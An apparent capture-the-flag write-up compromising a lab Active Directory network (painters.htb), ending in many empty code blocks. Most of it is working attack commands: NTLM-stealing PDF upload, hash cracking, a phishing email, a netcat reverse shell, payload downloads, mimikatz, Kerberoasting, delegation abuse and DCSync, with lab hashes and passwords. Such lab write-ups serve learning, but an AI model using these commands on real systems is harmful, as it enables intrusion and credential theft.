
Subnet: 10.10.110.0/24

10.10.110.2 is out-of-scope because it represents the firewall.

---
## ZEPHYR-MAIL [x]

Started off with host disocvery on the subnet.

```
nmap -sn 10.10.110.0/24 --min-rate 1000
```

Discovered the initial entry point 10.10.110.35

Let's start an port scan on it.

```
nmap -n -Pn -sSCV -p- -oA nmap/target 10.10.110.35
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-29 11:25 -0500
Nmap scan report for 10.10.110.35
Host is up (0.098s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:ca:e7:7e:99:03:a9:78:e8:86:2e:e8:cc:2b:9f:08 (RSA)
|   256 b1:7f:c0:06:9b:e7:08:b4:6a:ab:bd:c2:96:04:23:49 (ECDSA)
|_  256 0d:3b:89:bc:d5:a4:35:e0:dd:c4:22:14:7a:48:ad:7c (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://painters.htb/home
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to https://painters.htb/home
|_http-server-header: nginx/1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=painters.htb/countryName=GB
| Subject Alternative Name: DNS:mail.painters.htb, IP Address:192.168.110.51
| Not valid before: 2022-04-04T10:00:52
|_Not valid after:  2032-04-01T10:00:52
| tls-nextprotoneg: 
|   h2
|_  http/1.1
| tls-alpn: 
|   h2
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 189.86 seconds
```

The scan revealed that the target server seems to be an Linux Environment. It also reveals the SAN "mail.painters.htb". The target is probably ZEPHYR-MAIL. Which makes sense since Mailservers are most of the times inside the DMZ. It also reveals an redirect to painters.htb. Let's map the SAN & the domain to the target ip address in our local dns file. 

```
echo "10.10.110.35 mail.painters.htb painters.htb" | tee -a /etc/hosts
```

Upon inspecting the webpage we found 3 potential usernames.

```
Thomas Bishop
James Ray
Toby Harlington
```

Enumerated endpoints using gobuster and found interesting endpoints. Including /administration which seems to be an login panel & /vacancies endpoint which reveals information about another username.

```
Ralph Davies
```

Let's create an users wordlist out of them using the following username generator:

```
git clone https://github.com/florianges/UsernameGenerator
```

Stored all of the users in newusers.txt and then ran the following command to generate multiple usernames for bruteforcing:

```
UsernameGenerator.py newusers.txt users.txt
```

Since we don't got any passwords yet. Let's create an passwords.txt wordlist by utilizing an tool called cewl which crawls the whole website.

```
cewl http://painters.htb -x 15 -o -w passwords.txt
```

Before starting up bruteforcing the /administration endpoint. Let's try & enumerate subdomains with ffuf.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://painters.htb -H "Host: FUZZ.painters.htb" -fs 0
```

Couldn't find anything interesting let's proceed enumeration of endpoints with dirsearch & feroxbuster.

```
dirsearch -u http://painters.htb
```

Running feroxbuster was a bit more promising, since it discovered another admin panel or the same, but on another endpoint!

```
http://painters.htb/views/admin/
```

Alright let's start with bruteforcing the webpanel using hydra. We'll need to intercept traffic with Our Web-Proxy Tool BurpSuite first in order to prepare necessary stuff for hydra.

```
username=&pass=
```

Bruteforced the admin panel.

```
hydra -L creds/users.txt -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt painters.htb http-post-form "/administration/login:username=^USER^&pass=^PASS^:F=Incorrect Username or Password"
```

This didn't work. Upon accessing /vacancies endpoint I found an interesting upload functionality! It allows to upload PDF Files. Let's perform an Relay Attack.

Could we perform an NTLM Relay Attack?

1. Started up Responder on local machine

```
responder -I tun0
```

2. Utilized ntlm_theft.py in order to generate an malicious PDF File.

```
python3 ntlm_theft.py --generate pdf --server 10.10.14.121 --file important
```

3. Uploaded the PDF File on to the webpage.

Captured NTLM Hash of user "riley".

```
riley::PAINTERS:44c2d7225c629dc6:67EDABE3A6EF3A01DF5C147EAD399C96:0101000000000000000346212820DD010A9D03B7BD4BE2570000000002000800420036005600350001001E00570049004E002D004F0034004400490047004800300038004D003600580004003400570049004E002D004F0034004400490047004800300038004D00360058002E0042003600560035002E004C004F00430041004C000300140042003600560035002E004C004F00430041004C000500140042003600560035002E004C004F00430041004C0007000800000346212820DD010600040002000000080030003000000000000000000000000020000012CBE2BA1E4B24CBDC155D522AC3254D08144566D36C2032B68B7A224CCC0F480A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100320031000000000000000000
```

Cracked the NTLM Hash using john the ripper & retrieved an password.

```
john riley --wordlist=/usr/share/wordlists/rockyou.txt
```

```
riley:P@ssw0rd
```

Connected to the target server via SSH.

```
ssh riley@10.10.110.35
```

Retrieved flag.txt in /home/riley directory.

```
ZEPHYR{HuM4n_3rr0r_1s_0uR_D0wnf4ll}
```
## Privilege Escalation

Enumerated Database Credentials in /var/www/painters/models/DatabaseModel.php

```
riley:PainterDBPassword2022
```

Enumerated running MySQL Database.

```
netstat -tulnp
```

Connected to the database internally.

```
mysql -u riley -p 
```

Enumerated Database Credentials of user "admin".

```
show databases;
use painter;
show tables;
SELECT * FROM users;
```

```
admin:$2y$10$7BLIFYjCq4PF0U3ZH86b1eQLfO9EEIO.GRQMKM5XX02FAbBFd95j2
```

I inspected the running services again & realised there is a lot of mail services running. Every user also has an dedicated "Maildir" directory, in which all mails are being stored. Could we perform an phishing attack to get more credentials?

Before we will do this, let's proceed with enumerating the target server manually.

Transfered suid3num.py in order to enumerate SUID Binarys for Privilege Escalation.

1. Started up python3 webserver on my local machine.

```
wget http://10.10.14.121/suid3num.py suid3num.py
```

2. Gave the script executable permissions & ran it, but couldn't find anything useful.

```
chmod +x suid3num.py
python3 suid3num.py
```

Transfered LinPEAS onto the target.

```
wget http://10.10.14.121/linpeas.sh linpeas.sh
```

LinPEAS revealed that the target seems vulnerable to PwnKit. Let's abuse it.

```
wget http://10.10.14.121/PwnKit PwnKit
```

Didn't work. I decided to enumerate the "Maildir" Directory inside user rileys home directory. It had an interesting file in which user matt wrote an mail to riley with his password, but it's blank!

Downloaded the file.

```
scp riley@10.10.110.35:/home/riley/Maildir/cur/important_mail .
```

But this didn't display the password. Let's perform an Phishing Attack in which we send an mail as user 

We're gonna use this as layout to call an reverse connection to our responder.

```
swaks --to matt@painters.htb --from "IT-Support@painters.htb" --server 10.10.110.35 --header "Subject: Urgent: Security Update Required" --header "Content-Type: text/html" --body '<html><body><img src="\\10.10.14.121\share\logo.png"><a href="\\10.10.14.121\share\update.pdf">Update Now</a></body></html>'
```

This didn't work. I was also not able to connect to the Mail Services. Since I previously discovered the machine seems to be dual-hosted. Let's proceed with pivoting into the internal network!

1. Created Proxy Interface

```
ip tuntap add user saitama mode tun ligolo && ip link set ligolo up && ligolo-proxy -selfcert -laddr 0.0.0.0:80
```

2. Downloaded Transfered Linux Proxy Agent onto target server.

```
wget http://10.10.14.121/linux_agent_amd64_x86 linux_correct_agent
```

3. Connected from the target machine to my local proxy.

```
./linux_agent -connect 10.10.14.121:80 -ignore-cert
```

4. Started tunnel.

```
session
start --tun ligolo
```

5. Added route.

```
ip route add 192.168.110.0/24 dev ligolo
```

After I comprimised the Domain Controller I've received the plaintext password of user matt. Connected to the target machine as user "matt" via SSH.

```
ssh matt@10.10.110.35
```

It seems user matt has full sudo permissions without authentication. Let's login as root user.

```
sudo -l
[sudo] password for matt: 
Matching Defaults entries for matt on mail:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User matt may run the following commands on mail:
    (ALL : ALL) ALL
```

```
sudo su
```

Retrieved flag.txt in /root directory.

```
ZEPHYR{L34v3_N0_St0n3_Un7urN3d}
```

---
## Host Discovery

Performed Ping Sweeps now. There seems to be 5 endpoints open!

```
for i in {1..254} ;do (ping -c 1 192.168.110.$i | grep "bytes from" &) ;done
64 bytes from 192.168.110.51: icmp_seq=1 ttl=64 time=21.5 ms
64 bytes from 192.168.110.52: icmp_seq=1 ttl=64 time=21.3 ms
64 bytes from 192.168.110.53: icmp_seq=1 ttl=64 time=18.7 ms
64 bytes from 192.168.110.54: icmp_seq=1 ttl=64 time=22.7 ms
64 bytes from 192.168.110.55: icmp_seq=1 ttl=64 time=20.0 ms
```

Scanned all Ports on the newly discovered endpoints.

```
nmap -n -Pn -sSCV -p- 192.168.110.52-55
```

---
## ZEPHYR-PNTSVC [x]

An initial scan revealed the following information about the target endpoint.

```
Nmap scan report for 192.168.110.52
Host is up (0.047s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-30T21:56:23
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_nbstat: NetBIOS name: PNT-SVRSVC, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:20:e3:1a (unknown)
```

Sprayed Credentials as anonymous & guest user but both are either disabled or access is denied.

```
nxc smb 192.168.110.52 -u 'guest' -p '' --shares
```

Sprayed credentials with the previously discovered users and passwords and was able to authenticate as user "riley" and enumerated shares. But there is no interesting share.

```
nxc smb 192.168.110.52 -u riley -p 'P@ssw0rd' --shares
```

Tried connecting via rpcclient, but access got denied.

```
rpcclient -U 'riley%P@ssw0rd' 192.168.110.52
```

Since there is nothing open no more, let's try & move to the next target for now.

Since we previously discovered that we can connect via evil-winrm as web_svc I decided to connect to the target.

```
evil-winrm -i 192.168.110.52 -u web_svc -p '!QAZ1qaz'
```

It looks like we are part of the Administrators Group!

Retrieved flag.txt in C:\Users\Administrator\Desktop.

```
ZEPHYR{S3rV1c3_AcC0Un7_5PN_Tr0uBl35}
```

Enumerated users and found out about an local user named "James". Let's try & perform post exploitation.

Therefore I first wanna get an better shell. Let's transfer nc.exe onto the target server.

Started up python3 webserver in the directory in which nc.exe is stored.

```
python3 -m http.server 80
```

Transfered nc.exe onto the target server.

```
iwr -uri http://10.10.14.121:443/nc.exe -OutFile nc.exe
```

Started up listener on port 53.

```
rlwrap nc -lvnp 53
```

Executed the following command on the target server.

```
./nc.exe 10.10.14.121 53 -e cmd.exe
```

Gained RCE.

```
rlwrap nc -lvnp 53 
listening on [any] 53 ...
connect to [10.10.14.121] from (UNKNOWN) [10.10.110.35] 32126
Microsoft Windows [Version 10.0.20348.5139]
(c) Microsoft Corporation. All rights reserved.

C:\Temp>
```

Transfered mimikatz.exe onto the target server.

```
certutil -urlcache -split -f http://10.10.14.121:443/mimikatz.exe mimikatz.exe
```

Tried checking for passwords. But couldn't retrieve anything.

```
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

Extracted the SAM & SYSTEM File out of registry for dumping hashes.

```
reg save hklm\sam C:\Temp\SAM
reg save hklm\sam C:\Temp\SYSTEM
```

Downloaded them onto my local machine.

```
download SAM
download SYSTEM
```

Dumped all Hashes from memory and stored them in hashes.txt

```
impacket-secretsdump -system SYSTEM -sam SAM local
```

Since James isn't an domain user let's spray for winrm access with --local-auth flag.

We pwned PNT-SVRBPA!

```
nxc winrm 192.168.110.53 -u users.txt -H hashes.txt --continue-on-success --local-auth
```

Let's check if we can pwn SMB there aswell, so we have instant SYSTEM Shell. We do!

```
nxc smb 192.168.110.53 -u users.txt -H hashes.txt --continue-on-success --local-auth
```


---
## PNT-SVRBPA [x]

An initial scan revealed the following information about the target endpoint.

```
Nmap scan report for 192.168.110.53
Host is up (0.025s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1s
|_nbstat: NetBIOS name: PNT-SVRBPA, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:ae:d4:5b (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-30T21:56:22
|_  start_date: N/A
```

Sprayed Credentials and found out riley is authenticated again. I'm assuming those are domain credentials. But unfortunately no interesting non-defaut SMB Share is active.

```
nxc smb 192.168.110.53 -u users.txt -p passwords.txt --shares
```

Same play like on the previous endpoint, we can't winrm into the target & can't access via rpcclient. Let's move on to the next target.

Since we gained James Credentials, we can login via psexec.

```
impacket-psexec James@192.168.110.53 -hashes :8af1903d3c80d3552a84b6ba296db2ea
```

Retrieved flag.txt in C:\Users\Administrator\Desktop.

```
ZEPHYR{P3r5isT4nc3_1s_k3Y_4_M0v3men7}
```

I downloaded winPEAS onto the target server and it provided me credentials.

```
dfm.a:Password123!
```

Transfered mimikatz.exe onto the target server.

```
certutil -urlcache -split -f http://10.10.14.121:443/mimikatz.exe mimikatz.exe
```

Couldn't retrieve any useful passwords or anything.

I decided to mark all endpoints I comprimised as owned in BloodHound and found an interesting DACL for user Blake. PNT-SRVBPA has GenericWrite & ForceChangePassword for user Blake!

We'll need to get the NTLM Hash for the Machine Account of PNT-SRVBPA for this endavour. Retrieved it out of mimikatz

```
PNT-SRVBPA$:2dfcebbe9f5f4cb3bf98032887b3d7b6
```

Tried to perform an Shadow Credential Attack, but it seems like it didn't work.

```
certipy-ad shadow auto -u 'PNT-SRVBPA$@painters.htb' -hashes :2dfcebbe9f5f4cb3bf98032887b3d7b6 -account blake -dc-ip 192.168.110.55
```

Successfully abused ForceChangePassword. Changed blake's password with bloodyad.

```
bloodyad -u PNT-SVRBPA$ -p :2dfcebbe9f5f4cb3bf98032887b3d7b6 -d painters.htb --host dc.painters.htb set password blake 'Pass123!'
```

Verified if it worked & it did!

```
nxc smb 192.168.110.55 -u blake -p 'Pass123!'
```

We sprayed PNTSRVPSB & found out we pwned the box on winrm.

```
nxc winrm 192.168.110.54 -u blake -p 'Pass123!'
```




---
## PNT-SVRPSB [x]

An initial scan revealed the following information about the target endpoint.

```
Nmap scan report for 192.168.110.54
Host is up (0.024s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Since we are now authenticated as blake after comprising a couple of machines, let's connect via evil-winrm to the target machine.

```
evil-winrm -i 192.168.110.54 -u blake -p 'Pass123!'
```

Apparently we seem to be part of the Administrator Group.

Retrieved flag.txt in C:\Users\Administrator\Desktop.

```
ZEPHYR{7h3_Tru57_h45_B3eN_Br0k3n}
```

We can also see that user blake has "AllowedToDelegate" ACL onto the Doamin Controller.

This attack requests an TGT for the victim user and executes the S4U2self/S4U2proxy proccess to impersonte the admin user. 

1. Request Ticket

```
getST.py painters.htb/blake:'Pass123!' -spn CIFS/dc.painters.htb -impersonate administrator -altservice 'cifs'
```

2. Export .ccache ticket into Kerberos Variable

```
export KRB5CCNAME=administrator@cifs_dc.painters.htb@PAINTERS.HTB.ccache
```

2. Perform DCSync Attack to dump all Domain Hashes

```
impacket-secretsdump -k -no-pass 'painters.htb/Administrator'@dc.painters.htb
```

We retrieved all Hashes & the cleartext password for user matt!

```
matt:L1f30f4Spr1ngCh1ck3n!
```

---
## ZEPHYR-DC

An initial scan revealed the following information about the target endpoint.

```
Nmap scan report for 192.168.110.55
Host is up (0.037s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-30 21:55:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: painters.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: painters.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
10050/tcp open  tcpwrapped
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
65055/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
65064/tcp open  msrpc         Microsoft Windows RPC
65068/tcp open  msrpc         Microsoft Windows RPC
65083/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-30T21:56:23
|_  start_date: N/A
|_nbstat: NetBIOS name: DC, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:84:0d:23 (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Post-scan script results:
| clock-skew: 
|   0s: 
|     192.168.110.52
|_    192.168.110.55
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 4 IP addresses (4 hosts up) scanned in 982.73 seconds
```

The target seems to be an Domain Controller.

Enumerated SMB Shares, but couldn't find anything interesting.

```
nxc smb 192.168.110.55 -u users.txt -p passwords.txt --shares
```

Decided to check out ACL's of users using bloodhound. Downloaded domain information.

```
bloodhound-python -u riley -p 'P@ssw0rd' -ns 192.168.110.55 -d painters.htb -c all
```

Started bloodhound.

```
bloodhound-start
```

Uploaded domain information. Marked our current user "riley" as owned. But couldn't find any outbound object controls.

Queried for kerberoastable users & found two!

```
blake
web_svc
```

Let's get there TGT's, this failed with KDC_ERR_ETYPE_NOSUPP.

```
impacket-GetUserSPNs -request -dc-ip 192.168.110.55 painters.htb/riley
```

Enumerated domain users and saved the output in an newusers.txt file.

```
nxc smb 192.168.110.55 -u 'riley' -p 'P@ssw0rd' --rid-brute > newusers.txt
```

Formatted the wordlist and stored it inside an users.txt, for future bruteforcing.

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

Since we couldn't elevate privileges I decided to download domain information using rusthound for potential ADCS Priv Esc!

```
rusthound-ce --domain painters.htb -u riley -p 'P@ssw0rd'
```

Uploaded Rusthound Domain Information in BloodHound, but couldn't find anything related again.

Since the normal kerberoast didn't work I decided to perform an "targeted" Kerberoast and it worked, stored it inside an web_svc file on my local machine.

```
python3 /opt/arsenal/ActiveDirectory/targetedKerberoast/targetedKerberoast.py -v -d 'painters.htb' -u 'riley' -p 'P@ssw0rd' --dc-host dc.painters-htb --request-user web_svc
```

Cracked the TGT of web_svc & gained his password.

```
hashcat -m 19700 web_svc /usr/share/wordlists/rockyou.txt
```

```
web_svc:!QAZ1qaz
```

Let's try & get blake's TGT aswell! We got it!

```
python3 /opt/arsenal/ActiveDirectory/targetedKerberoast/targetedKerberoast.py -v -d 'painters.htb' -u 'web_svc' -p '!QAZ1qaz' --dc-host dc.painters-htb --request-user blake
```

Tried bruteforcing it, but couldn't find an result unfortunately.

```
hashcat -m 19700 blake /usr/share/wordlists/rockyou.txt
```

Let's spray users again, we couldn't connect to the DC for now. So I decided to spray agaisnt the other endpoints & got an hit on PNT-SVRSVC for web_svc

```
nxc winrm 192.168.110.52 -u users.txt -p passwords.txt --continue-on-success
```

Since we were able to perform an DCSync Attack with the Administrator .ccache ticket which we retrieved through user blake & AllowedToDelegate ACL. We got the Domain Admin Hash. Let's verify if we can comprimise the DC using it. We can!

```
nxc winrm dc.painters.htb -u Administrator -H 5bdd6a33efe43f0dc7e3b2435579aa53
```

Connected to the Domain Controller.

```
evil-winrm -i dc.painters.htb -u Administrator -H 5bdd6a33efe43f0dc7e3b2435579aa53
```

Retrieved flag.txt in C:\Users\Administrator\Desktop.

```
ZEPHYR{P41n73r_D0m41n_D0m1n4nc3}
```

Since we already performed post exploitation regarding credentials. Let's check if the target is dual-hosted. So we can potentially pivot into more internal endpoints. It's not unfortunately. 

Let's check for established connections or any hints.

```
netstat -ano
```

Revealed that there seems to be an established connection to an foreign address: 192.168.210.13

Let's setup an double pivot using ligolo-ng.

```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```